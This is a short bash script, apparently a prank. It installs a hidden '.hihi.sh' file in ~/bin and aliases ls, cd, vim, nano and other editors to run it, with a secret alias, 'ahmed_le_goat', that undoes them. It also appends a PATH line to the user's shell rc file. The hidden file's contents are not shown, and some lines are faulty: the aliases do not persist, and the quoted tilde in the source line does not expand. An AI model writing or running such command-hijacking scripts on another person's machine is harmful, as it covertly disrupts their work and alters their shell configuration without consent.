#!/bin/bash

mkdir -p ~/bin
mv .hihi.sh ~/bin/
chmod +x ~/bin/.hihi.sh
alias sl="sh ~/bin/.hihi.sh"
alias ls="sl"
alias cd="sl"
alias vim="sl"
alias vi="sl"
alias nvim="sl"
alias emacs="sl"
alias nano="sl"
alias ahmed_le_goat="unalias sl ls cd vim vi nvim emacs nano"
echo 'export PATH="$HOME/bin:$PATH"' >> ~/.$(basename $SHELL)rc 
source "~/.$(basename $SHELL)rc"
